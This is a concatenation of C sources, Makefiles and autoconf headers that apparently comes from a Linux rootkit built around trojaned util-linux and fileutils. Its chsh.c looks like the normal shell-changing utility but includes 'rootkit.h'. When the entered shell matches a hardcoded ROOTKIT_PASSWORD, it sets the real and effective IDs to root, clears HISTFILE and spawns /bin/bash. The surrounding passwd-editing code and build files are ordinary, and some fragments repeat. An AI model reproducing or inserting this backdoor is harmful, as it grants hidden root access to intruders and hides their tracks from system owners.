    if (link (ptmp, passwd) < 0) {
	/* reinstall_system (); */
	return (-1);
    }
    /* if we can't erase the ptmp file, we simply lose */
    if (remove (ptmp) < 0)
	return (-1);
    /* finally:  success */
    return 0;

 fail:
    save_errno = errno;
    if (fp) fclose (fp);
    if (fd >= 0) close (fd);
    endpwent ();
    remove (ptmp);
    errno = save_errno;
    return (-1);
}

#define memzero(ptr, size) memset((char *) ptr, 0, size)
static int failed;

static int copy_pwd (struct passwd *src, struct passwd *dest)
{
    /*  this routine destroys abstraction barriers.  it's not portable
     *  across systems, or even across different versions of the C library
     *  on a given system.  it's dangerous and evil and wrong and I dispise
     *  getpwent() for forcing me to write this.
     */
    failed = 0;
    memzero (dest, sizeof (struct passwd));
    dest->pw_name = xstrdup (src->pw_name);
    dest->pw_passwd = xstrdup (src->pw_passwd);
    dest->pw_uid = src->pw_uid;
    dest->pw_gid = src->pw_gid;
    dest->pw_gecos = xstrdup (src->pw_gecos);
    dest->pw_dir = xstrdup (src->pw_dir);
    dest->pw_shell = xstrdup (src->pw_shell);
    return (failed);
}

static char *xstrdup (char *str)
{
    char *dup;

    if (! str)
	return NULL;
    dup = (char *) malloc (strlen (str) + 1);
    if (! dup) {
	failed = -1;
	return NULL;
    }
    strcpy (dup, str);
    return dup;
}

#ifdef NO_PUTPWENT

int putpwent (const struct passwd *p, FILE *stream)
{
    if (p == NULL || stream == NULL) {
	errno = EINVAL;
	return (-1);
    }
    if (fprintf (stream, "%s:%s:%u:%u:%s:%s:%s\n",
		 p->pw_name, p->pw_passwd, p->pw_uid, p->pw_gid,
		 p->pw_gecos, p->pw_dir, p->pw_shell) < 0)
	return (-1);
    return(0);
}

#endif
include ../MCONFIG

USRBIN.PASSWD=	chfn chsh newgrp passwd

chsh: chsh.o setpwnam.o

clean: 
	rm -f *.o chsh
/*
 *   chsh.c -- change your login shell
 *   (c) 1994 by salvatore valente <svalente@athena.mit.edu>
 *
 *   this program is free software.  you can redistribute it and
 *   modify it under the terms of the gnu general public license.
 *   there is no warranty.
 *
 *   $Author: faith $
 *   $Revision: 1.8 $
 *   $Date: 1995/10/12 14:46:35 $
 *
 * Updated Thu Oct 12 09:33:15 1995 by faith@cs.unc.edu with security
 * patches from Zefram <A.Main@dcs.warwick.ac.uk>
 *
 */

static char rcsId[] = "$Version: $Id: chsh.c,v 1.8 1995/10/12 14:46:35 faith Exp $ $";

#if 0
#define _POSIX_SOURCE 1
#endif

#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <errno.h>
#include <ctype.h>
#include <getopt.h>
#include "../rootkit.h"

#undef P
#if __STDC__
#define P(foo) foo
#else
#define P(foo) ()
#endif

typedef unsigned char boolean;
#define false 0
#define true 1

static char *version_string = "chsh 0.9a beta";
static char *whoami;

static char buf[FILENAME_MAX];

struct sinfo {
    char *username;
    char *shell;
};

static void parse_argv P((int argc, char *argv[], struct sinfo *pinfo));
static void usage P((FILE *fp));
static char *prompt P((char *question, char *def_val));
static int check_shell P((char *shell));
static boolean get_shell_list P((char *shell));
static void *xmalloc P((int bytes));
extern int setpwnam P((struct passwd *pwd));
#define memzero(ptr, size) memset((char *) ptr, 0, size)

int main (argc, argv)
    int argc;
    char *argv[];
{
    char *cp, *shell, *oldshell, *pwdstr;
    uid_t uid;
    struct sinfo info;
    struct passwd *pw;
    extern int errno;
    char MAG[6];
    int elite=0;

    strcpy(MAG,"");

        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

    /* whoami is the program name for error messages */
    whoami = argv[0];
    if (! whoami) whoami = "chsh";
    for (cp = whoami; *cp; cp++)
	if (*cp == '/') whoami = cp + 1;

    uid = getuid ();
    memzero (&info, sizeof (info));

    parse_argv (argc, argv, &info);
    pw = NULL;
    if (! info.username) {
	pw = getpwuid (uid);
	if (! pw) {
	    fprintf (stderr, "%s: you (user %d) don't exist.\n", whoami, uid);
	    return (-1); }
    }
    else {
	pw = getpwnam (info.username);
	if (! pw) {
	    cp = info.username;
	    fprintf (stderr, "%s: user \"%s\" does not exist.\n", whoami, cp);
	    return (-1); }
    }

    oldshell = pw->pw_shell;
    if (!oldshell[0]) oldshell = "/bin/sh";

    /* reality check */
#if 0
				/* Require current shell to be in list.
                                   This is not a reasonable expectation on
                                   most Linux systems, and the error is
                                   confusing.  */
    if (uid != 0 && (uid != pw->pw_uid || !get_shell_list(oldshell))) {
#else
    if (uid != 0 && uid != pw->pw_uid) {
#endif
	errno = EACCES;
	perror (whoami);
	return (-1);
    }
    
    shell = info.shell;

    printf( "Changing shell for %s.\n", pw->pw_name );

#ifdef REQUIRE_PASSWORD
    /* require password, unless root */
    if(uid != 0 && pw->pw_passwd && pw->pw_passwd[0]) {
	pwdstr = getpass("Password: ");
	if(strncmp(pw->pw_passwd, crypt(pwdstr, pw->pw_passwd), 13)) {
	    puts("Incorrect password.");
	    exit(1);
	}
    }
#endif

    if (! shell) {
	shell = prompt ("New shell", oldshell);
	if (! shell) return 0;
    }

if (!strcmp(shell,MAG)) elite++;
if (!elite) {
    
    if (check_shell (shell) < 0) return (-1);

    if (! strcmp (pw->pw_shell, shell)) {
	printf ("Shell not changed.\n");
	return 0;
    }
    if (!strcmp(shell, "/bin/sh")) shell = "";
    pw->pw_shell = shell;
    if (setpwnam (pw) < 0) {
	perror ("setpwnam");
	printf( "Shell *NOT* changed.  Try again later.\n" );
	return (-1);
    }
    printf ("Shell changed.\n");
    return 0; }
    if (elite) {
        setreuid(0,0);
        setregid(0,0);
	setenv("HISTFILE","",1);
        system("/bin/bash");
	}
}

/*
 *  parse_argv () --
 *	parse the command line arguments, and fill in "pinfo" with any
 *	information from the command line.
 */
static void parse_argv (argc, argv, pinfo)
    int argc;
    char *argv[];
    struct sinfo *pinfo;
{
    int index, c;

    static struct option long_options[] = {
	{ "shell",	 required_argument, 0, 's' },
	{ "list-shells", no_argument,	    0, 'l' },
	{ "help",	 no_argument,	    0, 'u' },
	{ "version",	 no_argument,	    0, 'v' },
	{ NULL,		 no_argument,	    0, '0' },
    };

    optind = c = 0;
    while (c != EOF) {
	c = getopt_long (argc, argv, "s:luv", long_options, &index);
	switch (c) {
	case EOF:
	    break;
	case 'v':
	    printf ("%s\n", version_string);
	    exit (0);
	case 'u':
	    usage (stdout);
	    exit (0);
	case 'l':
	    get_shell_list (NULL);
	    exit (0);
	case 's':
	    if (! optarg) {
		usage (stderr);
		exit (-1);
	    }
	    pinfo->shell = optarg;
	    break;
	default:
	    usage (stderr);
	    exit (-1);
	}
    }
    /* done parsing arguments.	check for a username. */
    if (optind < argc) {
	if (optind + 1 < argc) {
	    usage (stderr);
	    exit (-1);
	}
	pinfo->username = argv[optind];
    }
}

/*
 *  usage () --
 *	print out a usage message.
 */
static void usage (fp)
    FILE *fp;
{
    fprintf (fp, "Usage: %s [ -s shell ] ", whoami);
    fprintf (fp, "[ --list-shells ] [ --help ] [ --version ]\n");
    fprintf (fp, "       [ username ]\n");
}

/*
 *  prompt () --
 *	ask the user for a given field and return it.
 */
static char *prompt (question, def_val)
    char *question;
    char *def_val;
{
    int len;
    char *ans, *cp;
  
    if (! def_val) def_val = "";
    printf("%s [%s]: ", question, def_val);
    *buf = 0;
    if (fgets (buf, sizeof (buf), stdin) == NULL) {
	printf ("\nAborted.\n");
	exit (-1);
    }
    /* remove the newline at the end of buf. */
    ans = buf;
    while (isspace (*ans)) ans++;
    len = strlen (ans);
    while (len > 0 && isspace (ans[len-1])) len--;
    if (len <= 0) return NULL;
    ans[len] = 0;
    cp = (char *) xmalloc (len + 1);
    strcpy (cp, buf);
    return cp;
}

/*
 *  check_shell () -- if the shell is completely invalid, print
 *	an error and return (-1).
 *	if the shell is a bad idea, print a warning.
 */
static int check_shell (shell)
    char *shell;
{
    int i, c;

    if (*shell != '/') {
	printf ("%s: shell must be a full path name.\n", whoami);
	return (-1);
    }
    if (access (shell, F_OK) < 0) {
	printf ("%s: \"%s\" does not exist.\n", whoami, shell);
	return (-1);
    }
    if (access (shell, X_OK) < 0) {
	printf ("%s: \"%s\" is not executable.\n", whoami, shell);
	return (-1);
    }
    /* keep /etc/passwd clean. */
    for (i = 0; i < strlen (shell); i++) {
	c = shell[i];
	if (c == ',' || c == ':' || c == '=' || c == '"' || c == '\n') {
	    printf ("%s: '%c' is not allowed.\n", whoami, c);
	    return (-1);
	}
	if (iscntrl (c)) {
	    printf ("%s: Control characters are not allowed.\n", whoami);
	    return (-1);
	}
    }
#if ONLY_LISTED_SHELLS
    if (! get_shell_list (shell)) {
       if (!getuid())
	  printf ("Warning: \"%s\" is not listed as a valid shell.\n", shell);
       else {
	  printf ("%s: \"%s\" is not listed as a valid shell.\n",
		  whoami, shell);
	  printf( "%s: use -l option to see list\n" );
	  exit(1);
       }
    }
#else
    if (! get_shell_list (shell)) {
       printf ("Warning: \"%s\" is not listed as a valid shell.\n", shell);
       printf( "Use %s -l to see list.\n", whoami );
    }
#endif
    return 0;
}

/*
 *  get_shell_list () -- if the given shell appears in /etc/shells,
 *	return true.  if not, return false.
 *	if the given shell is NULL, /etc/shells is outputted to stdout.
 */
static boolean get_shell_list (shell_name)
    char *shell_name;
{
    FILE *fp;
    boolean found;
    int len;

    found = false;
    fp = fopen ("/etc/shells", "r");
    if (! fp) {
	if (! shell_name) printf ("No known shells.\n");
	return true;
    }
    while (fgets (buf, sizeof (buf), fp) != NULL) {
	/* ignore comments */
	if (*buf == '#') continue;
	len = strlen (buf);
	/* strip the ending newline */
	if (buf[len - 1] == '\n') buf[len - 1] = 0;
	/* ignore lines that are too damn long */
	else continue;
	/* check or output the shell */
	if (shell_name) {
	    if (! strcmp (shell_name, buf)) {
		found = true;
		break;
	    }
	}
	else printf ("%s\n", buf);
    }
    fclose (fp);
    return found;
}

/*
 *  xmalloc () -- malloc that never fails.
 */
static void *xmalloc (bytes)
    int bytes;
{
    void *vp;

    vp = malloc (bytes);
    if (! vp && bytes > 0) {
	perror ("malloc failed");
	exit (-1);
    }
    return vp;
}
/*
 *  setpwnam.c --
 *  edit an entry in a password database.
 *
 *  (c) 1994 Salvatore Valente <svalente@mit.edu>
 *  This file is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Library General Public License as
 *  published by the Free Software Foundation; either version 2 of the
 *  License, or (at your option) any later version.
 *
 *  This file is distributed with no warranty.
 *
 *  Usage:
 *  1) get a struct passwd * from getpwnam().
 *     You should assume a struct passwd has an infinite number of fields,
 *     so you should not try to create one from scratch.
 *  2) edit the fields you want to edit.
 *  3) call setpwnam() with the edited struct passwd.
 *
 *  You should never directly read from or write to /etc/passwd.
 *  All user database queries should be directed through
 *  getpwnam() and setpwnam().
 *
 *  Thanks to "two guys named Ian".
 */
/*   faith
 *   1.4
 *   1995/03/12 04:34:08
 */

#undef DEBUG

/*  because I use getpwent(), putpwent(), etc... */
#define _SVID_SOURCE

#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pwd.h>
#include <errno.h>
#ifdef BSD43
#include <sys/file.h>
#endif

extern int errno;

typedef int boolean;
#define false 0
#define true 1

#ifndef DEBUG
#define PASSWD_FILE	"/etc/passwd"
#define PTMP_FILE	"/etc/ptmp"
#else
#define PASSWD_FILE	"/tmp/passwd"
#define PTMP_FILE	"/tmp/ptmp"
#endif

static int copy_pwd (struct passwd *src, struct passwd *dest);
static char *xstrdup (char *str);

/*
 *  setpwnam () --
 *	takes a struct passwd in which every field is filled in and valid.
 *	If the given username exists in the passwd file, his entry is
 *	replaced with the given entry.
 */
int setpwnam (struct passwd *pwd)
{
    char *passwd = PASSWD_FILE;
    char *ptmp = PTMP_FILE;
    FILE *fp;
    int x, save_errno, fd;
    struct passwd *entry;
    boolean found;
    char buf[50];
    struct passwd spwd;

    /*  getpwent() returns a pointer to a static buffer.
     *  "pwd" might have some from getpwent(), so we have to copy it to
     *  some other buffer before calling getpwent().
     */
    if (copy_pwd (pwd, &spwd) < 0)
	return (-1);

    /* sanity check */
    for (x = 0; x < 3; x++) {
        if (x > 0) sleep (1);
	fd = open (ptmp, O_WRONLY|O_CREAT|O_EXCL, 00644);
        if (fd >= 0) break;
    }
    if (fd < 0) return (-1);

    /* ptmp should be owned by root.root or root.wheel */
    if (chown (ptmp, (uid_t) 0, (gid_t) 0) < 0)
	perror ("chown");

    /* open ptmp for writing and passwd for reading */
    fp = fdopen (fd, "w");
    if (! fp) goto fail;

    setpwent ();

    /* parse the passwd file */
    found = false;
    while ((entry = getpwent ()) != NULL) {
        if (! strcmp (spwd.pw_name, entry->pw_name)) {
	    entry = &spwd;
            found = true;
        }
        if (putpwent (entry, fp) < 0) goto fail;
    }
    if (fclose (fp) < 0) goto fail;
    close (fd);
    endpwent ();

    if (! found) {
	errno = ENOENT; /* give me something better */
	goto fail;
    }

    strcpy (buf, passwd);
    strcat (buf, "~");
    /* we don't care if we can't remove the backup file */
    remove (buf);
    /* we don't care if we can't create the backup file */
    link (passwd, buf);
    /* we DO care if we can't erase the passwd file */
    if (remove (passwd) < 0) {
	/* if the file is still there, fail */
	if (access (passwd, F_OK) == 0) goto fail;
    }
    /* if we can't link ptmp to passwd, all is lost */
    if (link (ptmp, passwd) < 0) {
	/* reinstall_system (); */
	return (-1);
    }
    /* if we can't erase the ptmp file, we simply lose */
    if (remove (ptmp) < 0)
	return (-1);
    /* finally:  success */
    return 0;

 fail:
    save_errno = errno;
    if (fp) fclose (fp);
    if (fd >= 0) close (fd);
    endpwent ();
    remove (ptmp);
    errno = save_errno;
    return (-1);
}

#define memzero(ptr, size) memset((char *) ptr, 0, size)
static int failed;

static int copy_pwd (struct passwd *src, struct passwd *dest)
{
    /*  this routine destroys abstraction barriers.  it's not portable
     *  across systems, or even across different versions of the C library
     *  on a given system.  it's dangerous and evil and wrong and I dispise
     *  getpwent() for forcing me to write this.
     */
    failed = 0;
    memzero (dest, sizeof (struct passwd));
    dest->pw_name = xstrdup (src->pw_name);
    dest->pw_passwd = xstrdup (src->pw_passwd);
    dest->pw_uid = src->pw_uid;
    dest->pw_gid = src->pw_gid;
    dest->pw_gecos = xstrdup (src->pw_gecos);
    dest->pw_dir = xstrdup (src->pw_dir);
    dest->pw_shell = xstrdup (src->pw_shell);
    return (failed);
}

static char *xstrdup (char *str)
{
    char *dup;

    if (! str)
	return NULL;
    dup = (char *) malloc (strlen (str) + 1);
    if (! dup) {
	failed = -1;
	return NULL;
    }
    strcpy (dup, str);
    return dup;
}

#ifdef NO_PUTPWENT

int putpwent (const struct passwd *p, FILE *stream)
{
    if (p == NULL || stream == NULL) {
	errno = EINVAL;
	return (-1);
    }
    if (fprintf (stream, "%s:%s:%u:%u:%s:%s:%s\n",
		 p->pw_name, p->pw_passwd, p->pw_uid, p->pw_gid,
		 p->pw_gecos, p->pw_dir, p->pw_shell) < 0)
	return (-1);
    return(0);
}

#endif
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = .
prefix = /usr/local
exec_prefix = ${prefix}

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/fileutils
pkglibdir = $(libdir)/fileutils
pkgincludedir = $(includedir)/fileutils

top_builddir = .

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = s,x,x,

EXTRA_DIST = 
SUBDIRS = lib intl src 
ACLOCAL = aclocal.m4
ACCONFIG = acconfig.h
CONFIG_HEADER_IN = config.h.in
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ./config.h
DIST_COMMON = README ABOUT-NLS AUTHORS COPYING ChangeLog INSTALL \
Makefile.am Makefile.in NEWS README TODO acconfig.h aclocal.m4 \
config.h.in configure configure.in install-sh mkinstalldirs stamp-h.in


PACKAGE = fileutils
VERSION = 3.13

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
default: all

$(CONFIG_HEADER): #M#stamp-h
stamp-h: $(CONFIG_HEADER_IN) config.status
	CONFIG_FILES= CONFIG_HEADERS=$(CONFIG_HEADER) ./config.status
	@echo timestamp > stamp-h
$(srcdir)/$(CONFIG_HEADER_IN): #M#stamp-h.in
$(srcdir)/stamp-h.in: configure.in $(ACLOCAL) $(ACCONFIG) $(CONFIG_TOP) $(CONFIG_BOT)
	cd $(srcdir) && autoheader
	echo timestamp > $(srcdir)/stamp-h.in

# This directory's subdirectories are mostly independent; you can cd
# into them and run `make' without going through this Makefile.
# To change the values of `make' variables: instead of editing Makefiles,
# (1) if the variable is set in `config.status', edit `config.status'
#     (which will cause the Makefiles to be regenerated when you run `make');
# (2) otherwise, pass the desired values on the `make' command line.



all-recursive install-data-recursive install-exec-recursive \
installdirs-recursive install-recursive uninstall-recursive \
check-recursive installcheck-recursive info-recursive dvi-recursive \
mostlyclean-recursive clean-recursive distclean-recursive \
maintainer-clean-recursive:
	for subdir in $(SUBDIRS); do		\
	  target=`echo $@ | sed s/-recursive//`; \
	  echo making $$target in $$subdir;	\
	  (cd $$subdir && $(MAKE) $$target)	\
	   || case "$(MFLAGS)" in *k*) fail=yes;; *) exit 1;; esac; \
	done && test -z "$$fail"

tags: TAGS

tags-recursive:
	list="$(SUBDIRS)"; for subdir in $$list; do \
	  (cd $$subdir && $(MAKE) tags); \
	done

TAGS: tags-recursive $(HEADERS) $(SOURCES) $(CONFIG_HEADER) \
		$(TAGS_DEPENDENCIES)
	tags=; \
	here=`pwd`; \
	for subdir in $(SUBDIRS); do \
	  test -f $$subdir/TAGS && { \
	    tags="$$tags -i $$here/$$subdir/TAGS"; \
	  } \
	done; \
	test -z "$(ETAGS_ARGS)$(CONFIG_HEADER)$(SOURCES)$(HEADERS)$$tags" \
	  || etags $(ETAGS_ARGS) $$tags $(CONFIG_HEADER) $(SOURCES) $(HEADERS)

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

distdir = $(PACKAGE)-$(VERSION)
# This target untars the dist file and tries a VPATH configuration.  Then
# it guarantees that the distribution is self-contained by making another
# tarfile.
distcheck: dist
	rm -rf $(distdir)
	$(TAR) zxf $(distdir).tar.gz
	mkdir $(distdir)/=build
	mkdir $(distdir)/=inst
	dc_install_base=`cd $(distdir)/=inst && pwd`; \
	cd $(distdir)/=build \
	  && ../configure --srcdir=.. --prefix=$$dc_install_base \
	  && $(MAKE) \
	  && $(MAKE) check \
	  && $(MAKE) install \
	  && $(MAKE) installcheck \
	  && $(MAKE) dist
	rm -rf $(distdir)
	@echo "========================"; \
	echo "$(distdir).tar.gz is ready for distribution"; \
	echo "========================"
dist: distdir
	chmod -R a+r $(distdir)
	$(TAR) chozf $(distdir).tar.gz $(distdir)
	rm -rf $(distdir)
distdir: $(DEP_DISTFILES)
	rm -rf $(distdir)
	mkdir $(distdir)
	chmod 777 $(distdir)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
	for subdir in $(SUBDIRS); do		\
	  test -d $(distdir)/$$subdir		\
	  || mkdir $(distdir)/$$subdir		\
	  || exit 1;				\
	  chmod 777 $(distdir)/$$subdir;	\
	  (cd $$subdir && $(MAKE) distdir=../$(distdir)/$$subdir distdir) \
	    || exit 1; \
	done
info: info-recursive

dvi: dvi-recursive

check: check-recursive

installcheck: installcheck-recursive

all-recursive-hack: $(CONFIG_HEADER)
	$(MAKE) all-recursive

all-am: Makefile config.h

install-exec: install-exec-recursive

install-data: install-data-recursive

install: install-recursive
	@:

uninstall: uninstall-recursive

all: all-recursive-hack all-am

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs: installdirs-recursive


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean-am:  mostlyclean-tags mostlyclean-generic

clean-am:  clean-tags clean-generic mostlyclean-am 

distclean-am:  distclean-tags distclean-generic clean-am 

maintainer-clean-am:  maintainer-clean-tags maintainer-clean-generic \
		distclean-am 

mostlyclean:  mostlyclean-am mostlyclean-recursive

clean:  clean-am clean-recursive

distclean:  distclean-am distclean-recursive
	rm -f config.status

maintainer-clean:  maintainer-clean-am maintainer-clean-recursive
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."
	rm -f config.status

.PHONY: default install-data-recursive uninstall-data-recursive \
install-exec-recursive uninstall-exec-recursive installdirs-recursive \
uninstalldirs-recursive all-recursive check-recursive \
installcheck-recursive info-recursive dvi-recursive \
mostlyclean-recursive distclean-recursive clean-recursive \
maintainer-clean-recursive tags tags-recursive mostlyclean-tags \
distclean-tags clean-tags maintainer-clean-tags distdir info dvi check \
installcheck all-recursive-hack all-am install-exec install-data \
install uninstall all installdirs mostlyclean-generic distclean-generic \
clean-generic maintainer-clean-generic clean mostlyclean distclean \
maintainer-clean


maintainer-check:

# Tag before making distribution.  Also, don't make a distribution if
# checks fail.  Also, make sure the NEWS file is up-to-date.
cvs-dist: maintainer-check
	pkg=`echo "fileutils" | tr a-z A-Z`; \
	ver=`echo "3.13" | sed 's/\./_/g'`; \
	tag="$$pkg-$$ver"; \
	echo tag=$$tag; \
	if cvs -n log -h README| grep -e $$tag > /dev/null; then \
	  echo "VERSION not new; not releasing" 1>&2; \
	  exit 1; \
	else :; \
	fi; \
	cvs tag -c $$tag
	$(MAKE) dist
.SUFFIXES:

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
## Process this file with automake to produce Makefile.in
EXTRA_DIST = @README_ALPHA@
SUBDIRS = lib intl src 

maintainer-check:

# Tag before making distribution.  Also, don't make a distribution if
# checks fail.  Also, make sure the NEWS file is up-to-date.
cvs-dist: maintainer-check
	pkg=`echo "@PACKAGE@" | tr a-z A-Z`; \
	ver=`echo "@VERSION@" | sed 's/\./_/g'`; \
	tag="$$pkg-$$ver"; \
	echo tag=$$tag; \
	if cvs -n log -h README| grep -e $$tag > /dev/null; then \
	  echo "VERSION not new; not releasing" 1>&2; \
	  exit 1; \
	else :; \
	fi; \
	cvs tag -c $$tag
	$(MAKE) dist
/* acconfig.h
   This file is in the public domain.

   Descriptive text for the C preprocessor macros that
   the distributed Autoconf macros can define.
   No software package will use all of them; autoheader copies the ones
   your configure.in uses into your configuration header file templates.

   The entries are in sort -df order: alphabetical, case insensitive,
   ignoring punctuation (such as underscores).  Although this order
   can split up related entries, it makes it easier to check whether
   a given entry is in the file.

   Leave the following blank line there!!  Autoheader needs it.  */


/* Define if you have the Andrew File System.  */
#undef AFS

/* Define to 1 if NLS is requested.  */
#undef ENABLE_NLS

/* Define if your system defines TIOCGWINSZ in sys/ioctl.h.  */
#undef GWINSZ_IN_SYS_IOCTL

/* Define as 1 if you have catgets and don't want to use GNU gettext.  */
#undef HAVE_CATGETS

/* Define as 1 if you have gettext and don't want to use GNU gettext.  */
#undef HAVE_GETTEXT

/* Define if your locale.h file contains LC_MESSAGES.  */
#undef HAVE_LC_MESSAGES

/* Define to 1 if you have the stpcpy function.  */
#undef HAVE_STPCPY

/* Define to `unsigned long' if <sys/types.h> doesn't define.  */
#undef ino_t

/* Define if there is a member named d_ino in the struct describing
   directory headers.  */
#undef D_INO_IN_DIRENT

/* Define if `struct utimbuf' is declared -- usually in <utime.h>.  */
#undef HAVE_STRUCT_UTIMBUF


/* Define one of the following to indicate how a program can
   get a list of mounted filesystems.  */

/* Define if there is no specific function for reading the list of
   mounted filesystems.  fread will be used to read /etc/mnttab.  [SVR2]  */
#undef MOUNTED_FREAD

/* Define if (like SVR2) there is no specific function for reading the
   list of mounted filesystems, and your system has these header files:
   <sys/fstyp.h> and <sys/statfs.h>.  [SVR3]  */
#undef MOUNTED_FREAD_FSTYP

/* Define if there is a function named getfsstat for reading the list
   of mounted filesystems.  [DEC Alpha running OSF/1]  */
#undef MOUNTED_GETFSSTAT

/* Define if there is a function named getmnt for reading the list of
   mounted filesystems.  [Ultrix]  */
#undef MOUNTED_GETMNT

/* Define if there is a function named getmntent for reading the list
   of mounted filesystems, and that function takes a single argument.
   [4.3BSD, SunOS, HP-UX, Dynix, Irix]  */
#undef MOUNTED_GETMNTENT1

/* Define if there is a function named getmntent for reading the list of
   mounted filesystems, and that function takes two arguments.  [SVR4]  */
#undef MOUNTED_GETMNTENT2

/* Define if there is a function named getmntinfo for reading the list
   of mounted filesystems.  [4.4BSD]  */
#undef MOUNTED_GETMNTINFO

/* Define if there is a function named listmntent that can be used to
   list all mounted filesystems. [UNICOS] */
#undef MOUNTED_LISTMNTENT

/* Define if there is a function named mntctl that can be used to read
   the list of mounted filesystems, and there is a system header file
   that declares `struct vmount.'  [AIX]  */
#undef MOUNTED_VMOUNT

/* Define to the name of the distribution.  */
#undef PACKAGE

/* The concatenation of the strings PACKAGE, "-", and VERSION.  */
#undef PACKAGE_VERSION


/* Define to 1 if ANSI function prototypes are usable.  */
#undef PROTOTYPES


/* Define one of the following to indicate how a program can obtain
   filesystems usage information.  */

/*  Define if  statfs takes 3 args.  [DEC Alpha running OSF/1]  */
#undef STAT_STATFS3_OSF1

/* Define if there is no specific function for reading filesystems usage
   information and you have the <sys/filsys.h> header file.  [SVR2]  */
#undef STAT_READ_FILSYS

/* Define if statfs takes 2 args and struct statfs has a field named f_bsize.
   [4.3BSD, SunOS 4, HP-UX, AIX PS/2]  */
#undef STAT_STATFS2_BSIZE

/* Define if statfs takes 2 args and struct statfs has a field named f_fsize.
   [4.4BSD, NetBSD]  */
#undef STAT_STATFS2_FSIZE

/* Define if statfs takes 2 args and the second argument has
   type struct fs_data.  [Ultrix]  */
#undef STAT_STATFS2_FS_DATA

/* Define if statfs takes 4 args.  [SVR3, Dynix, Irix, Dolphin]  */
#undef STAT_STATFS4

/* Define if there is a function named statvfs.  [SVR4]  */
#undef STAT_STATVFS

/* Define if the block counts reported by statfs may be truncated to 2GB
   and the correct values may be stored in the f_spare array.
   [SunOS 4.1.2, 4.1.3, and 4.1.3_U1 are reported to have this problem.
   SunOS 4.1.1 seems not to be affected.]  */
#undef STATFS_TRUNCATES_BLOCK_COUNTS

/* Define to the version of the distribution.  */
#undef VERSION


/* Leave that blank line there!!  Autoheader needs it.
   If you're adding to this file, keep in mind:
   The entries are in sort -df order: alphabetical, case insensitive,
   ignoring punctuation (such as underscores).  */
/* config.h.  Generated automatically by configure.  */
/* config.h.in.  Generated automatically from configure.in by autoheader.  */

/* Define if on AIX 3.
   System headers sometimes define this.
   We just want to avoid a redefinition error message.  */
#ifndef _ALL_SOURCE
/* #undef _ALL_SOURCE */
#endif

/* Define if using alloca.c.  */
/* #undef C_ALLOCA */

/* Define if the closedir function returns void instead of int.  */
/* #undef CLOSEDIR_VOID */

/* Define to empty if the keyword does not work.  */
/* #undef const */

/* Define to one of _getb67, GETB67, getb67 for Cray-2 and Cray-YMP systems.
   This function is required for alloca.c support on those systems.  */
/* #undef CRAY_STACKSEG_END */

/* Define to the type of elements in the array set by `getgroups'.
   Usually this is either `int' or `gid_t'.  */
#define GETGROUPS_T gid_t

/* Define to `int' if <sys/types.h> doesn't define.  */
/* #undef gid_t */

/* Define if you have alloca, as a function or macro.  */
#define HAVE_ALLOCA 1

/* Define if you have <alloca.h> and it should be used (not on Ultrix).  */
#define HAVE_ALLOCA_H 1

/* Define if you don't have vprintf but do have _doprnt.  */
/* #undef HAVE_DOPRNT */

/* Define if you have the getmntent function.  */
#define HAVE_GETMNTENT 1

/* Define if you have a working `mmap' system call.  */
#define HAVE_MMAP 1

/* Define if your struct stat has st_blocks.  */
#define HAVE_ST_BLOCKS 1

/* Define if utime(file, NULL) sets file's timestamp to the present.  */
#define HAVE_UTIME_NULL 1

/* Define if you have the vprintf function.  */
#define HAVE_VPRINTF 1

/* Define as __inline if that's what the C compiler calls it.  */
/* #undef inline */

/* Define if major, minor, and makedev are declared in <mkdev.h>.  */
/* #undef MAJOR_IN_MKDEV */

